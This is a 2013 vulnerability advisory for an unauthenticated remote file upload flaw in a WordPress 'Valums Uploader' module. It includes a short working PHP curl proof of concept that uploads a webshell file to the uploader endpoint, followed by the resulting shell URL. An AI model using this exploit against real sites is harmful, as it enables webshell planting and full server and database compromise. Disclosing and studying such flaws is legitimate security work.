Common Vulnerability Scoring System:
====================================
7.5


Abstract:
=========
The independent laboratory researcher (jingo-bd) discovered a remote file upload vulnerability in the Wordpress `Valums Uploader` application.


Report-Timeline:
================
2013-01-04:	Public Disclosure


Status:
========
Published


Exploitation-Technique:
=======================
Remote


Severity:
=========
High


Details:
========
A file upload vulnerability is detected in the Wordpress `Valums Uploader` application module.
The vulnerability allows remote attackers to upload files like webshells and co. to unauthorized access them after 
the upload to compromise the application system.

The vulnerability is located in the valums uploader module when processing to request for uploads via POST.
Attackers can unauthorized upload own files to compromise the web application or system dbms.

Exploitation of the file upload vulnerability requires no user interaction and can be processed without privileged 
application user account. Successful exploitation of the remote file upload vulnerability results in system and dbms compromise.

Vulnerable Module(s):
			[+] Valums Uploader


Proof of Concept:
=================
The remote vulnerability can be exploited by remote attackers without required user interaction and without privileged application user account.
For demonstration or reproduce ...

<?php

$uploadfile="bangla.php"; 
$ch =
curl_init("http://localhost/wordpress/VALUMS_UPLOADER_PATH/php.php");
curl_setopt($ch, CURLOPT_POST, true); 
curl_setopt($ch, CURLOPT_POSTFIELDS,
array('qqfile'=>"@$uploadfile"));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$postResult = curl_exec($ch);
curl_close($ch);
print "$postResult";

?>

Shell Access: http://localhost/wp-content/uploads/2013/01/bangla.php

Risk:
=====
The security risk of the unauthorized shell upload exploit is estimated as high(+).
